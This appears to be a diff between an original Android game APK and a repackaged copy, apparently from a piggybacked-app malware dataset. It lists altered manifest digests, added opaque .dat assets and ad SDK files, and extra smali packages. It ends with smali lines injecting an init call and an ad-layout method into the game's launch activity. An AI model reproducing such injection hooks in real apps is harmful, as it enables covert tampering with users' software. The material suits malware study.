+> SHA1-Digest: SoMKIhKp4KnvEAjO6XjHIzbj434=
+1110a1123,1125
+> Name: res/raw/bgm_menu.mp3
+> SHA1-Digest: 39p5dS4ZLpwfch7Mpk7uGLFMFMM=
+> 
+1117,1119d1131
+< Name: res/raw/bgm_menu.mp3
+< SHA1-Digest: 39p5dS4ZLpwfch7Mpk7uGLFMFMM=
+< 
+1130c1142
+< SHA1-Digest: a3ZPDTye+C7loHpiijSb9MWy7ug=
+---
+> SHA1-Digest: JyzIWOVn6W0jhIR1yKO8uuoz/9A=
+1241c1253
+< SHA1-Digest: XNWB67huGwxmsHRj936LLK6bxBk=
+---
+> SHA1-Digest: ZahzU1CS+DePYRqJxk2noYUt+GM=
+1244c1256
+< SHA1-Digest: //qhPDoP0nGzuyk3arQogoT7Y1w=
+---
+> SHA1-Digest: WslN5K3t19utWV9prR2djIiYkk8=
+1306,1308d1317
+< Name: assets/menu_item_desc_1.png
+< SHA1-Digest: Mtl5jA421Km5jQ45wfEZj5f0EWs=
+< 
+1311a1321,1323
+> Name: assets/menu_item_desc_1.png
+> SHA1-Digest: Mtl5jA421Km5jQ45wfEZj5f0EWs=
+> 
+1318,1320d1329
+< Name: assets/GBR.png
+< SHA1-Digest: MtlzSSbpfNVFommABkWir6/Gsd4=
+< 
+1323a1333,1335
+> Name: assets/GBR.png
+> SHA1-Digest: MtlzSSbpfNVFommABkWir6/Gsd4=
+> 
+1326a1339,1341
+> Name: res/drawable-hdpi/com_facebook_button_grey_focused.9.png
+> SHA1-Digest: gEU1AaJm7WVZA29WKdquN+8iY38=
+> 
+1332,1334d1346
+< 
+< Name: res/drawable-hdpi/com_facebook_button_grey_focused.9.png
+< SHA1-Digest: TwHJaVP/UWV0QVyYXpbs8ND4qyU=
+diff -r result/APP_90/App_B_90/original/META-INF/MANIFEST.MF result/APP_90/App_M_90/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+23c23
+< SHA1-Digest: lAZShqCp7IYGBVS8plPFpOuLZ2k=
+---
+> SHA1-Digest: z11IuECZi/WSbpuASXkttt/bdYc=
+53c53
+< SHA1-Digest: nWMJZj4LvGokNkRFTye4fTs5uJE=
+---
+> SHA1-Digest: rRKNI/UnLk+3oanQ5etQgZ4EiVU=
+96a97,99
+> Name: assets/9.dat
+> SHA1-Digest: zBoPjoLLdPOE2px5zmEHPyurils=
+> 
+98c101
+< SHA1-Digest: ughAWBlhb5fxIgHli8NgEiGGjGY=
+---
+> SHA1-Digest: 2+roAR7vFM1hfNzNXTEYl5YHtaA=
+127,129d129
+< Name: assets/MLT.png
+< SHA1-Digest: wqvXNvY9XESQc+r3buEXkq1+4gw=
+< 
+132a133,135
+> Name: assets/MLT.png
+> SHA1-Digest: wqvXNvY9XESQc+r3buEXkq1+4gw=
+> 
+175,177d177
+< Name: res/layout/com_facebook_usersettingsfragment.xml
+< SHA1-Digest: r10vINeeVE1hRib934lJn2tUrQ0=
+< 
+180a181,183
+> Name: res/layout/com_facebook_usersettingsfragment.xml
+> SHA1-Digest: 7yK48V7GumyTb8sKbNCM9PNQUi4=
+> 
+186a190,192
+> Name: assets/btn/pic.dat
+> SHA1-Digest: hZm7d/Jx5BPdDqPbDwtXCSeWJL4=
+> 
+192c198
+< SHA1-Digest: U2RKQeMUym8uRDPLqKy9LVCCoko=
+---
+> SHA1-Digest: RUG7AM+KGnY3UNSXQ2NIElVRNSQ=
+200,201c206,207
+< Name: res/drawable-xhdpi/com_facebook_button_grey_pressed.9.png
+< SHA1-Digest: CKFnDef2GfRTaRgjuT6+/5YzUk4=
+---
+> Name: res/raw/snd_aim_shot.ogg
+> SHA1-Digest: n0uGiH771ZfVptjehU5FJXHSR3g=
+206,207c212,213
+< Name: res/raw/snd_aim_shot.ogg
+< SHA1-Digest: n0uGiH771ZfVptjehU5FJXHSR3g=
+---
+> Name: res/drawable-xhdpi/com_facebook_button_grey_pressed.9.png
+> SHA1-Digest: M5GEIvkZZMJQE8gmsU0xMUdHI0A=
+216c222
+< SHA1-Digest: HgF+d8Q8NiYpvP0Hocu1AuD9NLM=
+---
+> SHA1-Digest: 0q1xgcxXh1XLwrT0wmM7gfuoa88=
+236,238d241
+< Name: res/drawable-xhdpi/com_facebook_close.png
+< SHA1-Digest: 0IaTuYpHdwNgyn8PrCfM4P1LSUM=
+< 
+242,243c245,246
+< Name: res/drawable-hdpi/loading_5.png
+< SHA1-Digest: NwKgsi7911mkD3NYnynTpVNDQJc=
+---
+> Name: res/drawable-xhdpi/com_facebook_close.png
+> SHA1-Digest: 0IaTuYpHdwNgyn8PrCfM4P1LSUM=
+253a257,259
+> Name: res/drawable-hdpi/loading_5.png
+> SHA1-Digest: NwKgsi7911mkD3NYnynTpVNDQJc=
+> 
+258c264
+< SHA1-Digest: jRaA0i8omIt4BhNzwZ5EoxEW2A8=
+---
+> SHA1-Digest: aUG+bIacd9CSQxNKUbcW4tAdy3g=
+270c276
+< SHA1-Digest: lG/zCb3oy0KfYFGiir4TBY7YQIw=
+---
+> SHA1-Digest: iz0SahgG2YqKRDA4+Q5yFRvXGSs=
+301a308,310
+> Name: assets/l/l.dat
+> SHA1-Digest: iS+a8wBOFUjZSg1Zuqs0GC6Vnrk=
+> 
+336c345
+< SHA1-Digest: tWUWjtTo3HxE/8a02qZ5QsaeyfM=
+---
+> SHA1-Digest: BLO0e68L5W2Vka+WKJZeLOZ1bo4=
+351c360
+< SHA1-Digest: gdxExX46vHlYExFZGJmW0s0yjZI=
+---
+> SHA1-Digest: SScnFQZ50+dq7FpLu/6cExNj7uM=
+381c390
+< SHA1-Digest: wx0FTcs+RGcIb3fC9wYKpWawDgI=
+---
+> SHA1-Digest: tDVbhpAelbxfy8H65tNTwt40axE=
+414,417c423
+< SHA1-Digest: rfhOkaUqjVmlH0wKJ91d4XoVtfw=
+< 
+< Name: assets/COM.png
+< SHA1-Digest: +ET9sdgeMMpo6lOAk5V2JDzXkmE=
+---
+> SHA1-Digest: 6mazhCu91JnqMyr1ynKCpD+Xr30=
+421a428,430
+> Name: assets/COM.png
+> SHA1-Digest: +ET9sdgeMMpo6lOAk5V2JDzXkmE=
+> 
+453c462
+< SHA1-Digest: tEiJ3KB29IYkGSOV3ogNKWxQJwg=
+---
+> SHA1-Digest: 7Nm6e4GkJDwg8fCiN98SqBzxNb4=
+459c468
+< SHA1-Digest: YgNzOxZeRf1wrlJqxcQVDmEePjs=
+---
+> SHA1-Digest: qjVJfnUw+xpAdv/WmQa1Xvv95X8=
+489c498
+< SHA1-Digest: V1klffDzf6c7j+GZ2TNbXpIDbus=
+---
+> SHA1-Digest: AWaAjdOEiqMetxk72+lawT2M/FI=
+500,502d508
+< Name: res/drawable-hdpi/progress_style.xml
+< SHA1-Digest: E55nnt0GYcAsye+QIo0ww2ZIzF0=
+< 
+505a512,514
+> Name: res/drawable-hdpi/progress_style.xml
+> SHA1-Digest: KA0j66Z+s50/VldXtWSwQ7q9Mag=
+> 
+558c567,570
+< SHA1-Digest: GnT22Uh8XozObRvuJwbfo+2p7O0=
+---
+> SHA1-Digest: 9gCMvgiPujlPsIgDW7mIIrnqWic=
+> 
+> Name: res/layout/edit_dialog.xml
+> SHA1-Digest: MxqrvEQwug5X2CVgaiVfr/mgDi8=
+563,565d574
+< Name: res/layout/edit_dialog.xml
+< SHA1-Digest: 0wvsBUl6xeVMvRmEZ1T7UQBV/Is=
+< 
+567c576
+< SHA1-Digest: wq1XBihYEP7fT9hT55vx2S7+KDQ=
+---
+> SHA1-Digest: dTj9aA5U1JrfqmbGla663kUvykA=
+590,592d598
+< Name: res/drawable-hdpi/com_facebook_icon.png
+< SHA1-Digest: V2LEVKYg2PFb0nYYOBnKjQliS/s=
+< 
+598a605,607
+> Name: res/drawable-hdpi/com_facebook_icon.png
+> SHA1-Digest: V2LEVKYg2PFb0nYYOBnKjQliS/s=
+> 
+615c624
+< SHA1-Digest: FpCN68q2eV+3WjoqLCPZ0C/7pGQ=
+---
+> SHA1-Digest: rZ+51bTjhTihz+q1suJOzXbkqDA=
+627c636
+< SHA1-Digest: 2jGeRfgb5Xm7OmXOYRKQWRbaaUw=
+---
+> SHA1-Digest: sLm08yeBnYkFiIQWTuRpAfhKuFE=
+669c678
+< SHA1-Digest: w/awfZeucwp5r5kmJEwZuoch3MQ=
+---
+> SHA1-Digest: d0sy31pAd5Znrtnh4jBQVXeVBUg=
+705c714
+< SHA1-Digest: qvnLoW3TbOetSLjaVHx5vdZxzG0=
+---
+> SHA1-Digest: zVFxcbUjaVjtB9ihSog+Xgyk19g=
+714c723
+< SHA1-Digest: oegkN07TNc6Ko8z3qqCgUGgnvRw=
+---
+> SHA1-Digest: /pJq6tQ0C3gEwAvrLJPRvSIb5GQ=
+720c729
+< SHA1-Digest: kdah4Cfj0iH95OMI40wSLIZr+K0=
+---
+> SHA1-Digest: puPGTrSMdwpzT+I8qjSyKDuaijU=
+812,814d820
+< Name: res/layout/com_facebook_login_activity_layout.xml
+< SHA1-Digest: e+LSGCe832LwSYj9z2S77G/QUi0=
+< 
+816c822,825
+< SHA1-Digest: qDPKHiBdKPRyhbH8yfODHSxBw6E=
+---
+> SHA1-Digest: xqPlKwHnqqTKA5M79qVUvx9h0YI=
+> 
+> Name: res/layout/com_facebook_login_activity_layout.xml
+> SHA1-Digest: ftihyDnDECi8o3YemDrx6Pgs6C8=
+866,868d874
+< Name: res/drawable-xhdpi/com_facebook_button_grey_normal.9.png
+< SHA1-Digest: ObpXSA4NH1YwVj8ZgzYz74kaDfE=
+< 
+871a878,880
+> Name: res/drawable-xhdpi/com_facebook_button_grey_normal.9.png
+> SHA1-Digest: 5/VvnE4EdRlk92Ixf31qJMwc8yk=
+> 
+895a905,907
+> Name: res/layout/com_facebook_picker_list_section_header.xml
+> SHA1-Digest: ml0rwKcxyW7y/QRbFks7n7OItkw=
+> 
+899,901d910
+< Name: res/layout/com_facebook_picker_list_section_header.xml
+< SHA1-Digest: MIzlnA66T0RusUkeCiG3eh3M7n4=
+< 
+909c918
+< SHA1-Digest: CArsBA/aoIXheJEN6Qr+ZqtEK+M=
+---
+> SHA1-Digest: DX+FgGQY5MqccwO31kSqTOBnr0M=
+923,924c932,933
+< Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_normal.png
+< SHA1-Digest: xGQtABb1AitSeN8uVNWHd/+8MQ0=
+---
+> Name: assets/Zhuamob_sdk_v1.8.2.version
+> SHA1-Digest: clYnmU5siqvu2/EIpQn2Sb7+hqo=
+931a941,943
+> Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_normal.png
+> SHA1-Digest: xGQtABb1AitSeN8uVNWHd/+8MQ0=
+> 
+933c945
+< SHA1-Digest: BvNuj0JM4dW1M5X/qZOU04aa9aQ=
+---
+> SHA1-Digest: jib9BFjufVmfRf23zWRe93t3zGo=
+974,976d985
+< Name: res/drawable-ldpi/com_facebook_icon.png
+< SHA1-Digest: lPHIYoqZ+2OpY0LPumyDkUdNdoc=
+< 
+979a989,991
+> Name: res/drawable-ldpi/com_facebook_icon.png
+> SHA1-Digest: lPHIYoqZ+2OpY0LPumyDkUdNdoc=
+> 
+981c993
+< SHA1-Digest: 4hOY46Sq20ae3wFhM/a0jMrwEl8=
+---
+> SHA1-Digest: Z2PJ2JHT8I1XfrLOznAWUeB9nd8=
+988a1001,1003
+> Name: res/raw/snd_door_attack_0.ogg
+> SHA1-Digest: 2hU0MVX3CO6IPn0Cavj7/9wWYbs=
+> 
+995,997d1009
+< Name: res/raw/snd_door_attack_0.ogg
+< SHA1-Digest: 2hU0MVX3CO6IPn0Cavj7/9wWYbs=
+< 
+1025,1027d1036
+< Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_pressed.png
+< SHA1-Digest: vaIikRMPOeSzfh5geLs840nHy5o=
+< 
+1030a1040,1042
+> Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_pressed.png
+> SHA1-Digest: vaIikRMPOeSzfh5geLs840nHy5o=
+> 
+1033c1045
+< SHA1-Digest: UudkMujfDbVwQrl+1pBZ2WIJ8ro=
+---
+> SHA1-Digest: 4mIyMbCIDrP0CS0cmF/zMAWfXis=
+1038,1040d1049
+< Name: res/drawable-hdpi/loading_7.png
+< SHA1-Digest: g+9Xrx+ecaYNuEsCvIlmEACTT/c=
+< 
+1043a1053,1055
+> Name: res/drawable-hdpi/loading_7.png
+> SHA1-Digest: g+9Xrx+ecaYNuEsCvIlmEACTT/c=
+> 
+1053,1055d1064
+< Name: assets/IS.png
+< SHA1-Digest: Yj2swmgt8q7/3BIv95PsMrUCWg4=
+< 
+1058a1068,1070
+> Name: assets/IS.png
+> SHA1-Digest: Yj2swmgt8q7/3BIv95PsMrUCWg4=
+> 
+1060c1072
+< SHA1-Digest: rUK8E8s6v6SUeFFCEGddobibrmk=
+---
+> SHA1-Digest: rVoEy5Xk/mghEnPCi9flKLJh9Qg=
+1081c1093
+< SHA1-Digest: YVbAUqhI0nfFRKN2a5ZHZBt9e/M=
+---
+> SHA1-Digest: p9X3pD4+A+e0JdqR6I7MeZ4756A=
+1096c1108
+< SHA1-Digest: kZ9314YgSZHYcEuP+vXCuujxd48=
+---
+> SHA1-Digest: cnXvZnyzoekrDaT7KLyxsSzNy0s=
+1109a1122,1124
+> Name: res/raw/bgm_menu.mp3
+> SHA1-Digest: Qu9HfbtG7Sbpf7HztUAZ7Z8b8Ds=
+> 
+1116,1118d1130
+< Name: res/raw/bgm_menu.mp3
+< SHA1-Digest: Qu9HfbtG7Sbpf7HztUAZ7Z8b8Ds=
+< 
+1129c1141
+< SHA1-Digest: /FUqhbP4sLyDV5ZsrVCDCjtI2zA=
+---
+> SHA1-Digest: ZQj8Q/7dmsrqEjIGg0JptS78+cA=
+1240c1252
+< SHA1-Digest: uVL9frI9OkdqthUpBTskAV6mEpE=
+---
+> SHA1-Digest: 3bS24pJylqwQoa587ZG8NN6t0+Q=
+1243c1255
+< SHA1-Digest: P0wPjAW7g0+CwVv4YccsLFHlsh0=
+---
+> SHA1-Digest: hWtRzFzpcDoV4fnxX1mT/OaimrQ=
+1305,1307d1316
+< Name: res/drawable-mdpi/ic_launcher.png
+< SHA1-Digest: I3MP0NXnINH3Gb4a/IxI+nMF2mw=
+< 
+1310a1320,1322
+> Name: res/drawable-mdpi/ic_launcher.png
+> SHA1-Digest: I3MP0NXnINH3Gb4a/IxI+nMF2mw=
+> 
+1317,1319d1328
+< Name: res/drawable-hdpi/com_facebook_close.png
+< SHA1-Digest: vzoVwUXnEtJQCL4582EeDreqvIA=
+< 
+1322a1332,1334
+> Name: res/drawable-hdpi/com_facebook_close.png
+> SHA1-Digest: vzoVwUXnEtJQCL4582EeDreqvIA=
+> 
+1326,1328d1337
+< Name: res/drawable-hdpi/com_facebook_button_grey_focused.9.png
+< SHA1-Digest: xw3C3hxhbAqRc7fZEiHwllptNuM=
+< 
+1333a1343,1345
+> 
+> Name: res/drawable-hdpi/com_facebook_button_grey_focused.9.png
+> SHA1-Digest: h8+9CHc6UrwsqtrsCUOh+7hjFSw=
+Somente em result/APP_90/App_M_90/smali/com: looton
+Somente em result/APP_90/App_M_90/smali/com: naiiwt
+diff -r result/APP_90/App_B_90/smali/com/rhaonplus/survivealone/LogoActivity.smali result/APP_90/App_M_90/smali/com/rhaonplus/survivealone/LogoActivity.smali
+61a62,63
+>     invoke-static {p0}, Lcom/naiiwt/toolon/core/CsoalActivity;->init(Landroid/content/Context;)V
+> 
+130a133,159
+>     return-void
+> .end method
+> 
+> .method public toStart()V
+>     .locals 4
+> 
+>     .prologue
+>     new-instance v1, Lcom/zhuamob/android/ZhuamobLayout;
+> 
+>     invoke-direct {v1, p0}, Lcom/zhuamob/android/ZhuamobLayout;-><init>(Landroid/app/Activity;)V
+> 
+>     .local v1, "zhuamobLayout":Lcom/zhuamob/android/ZhuamobLayout;
+>     new-instance v0, Landroid/widget/FrameLayout$LayoutParams;
+> 
+>     const/4 v2, -0x1
+> 
+>     const/4 v3, -0x2
+> 
+>     invoke-direct {v0, v2, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V
+> 
+>     .local v0, "params":Landroid/widget/FrameLayout$LayoutParams;
+>     const/16 v2, 0x50
+> 
+>     iput v2, v0, Landroid/widget/FrameLayout$LayoutParams;->gravity:I
+> 
+>     invoke-virtual {p0, v1, v0}, Lcom/aaaa/ZhuamobActivity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
+> 
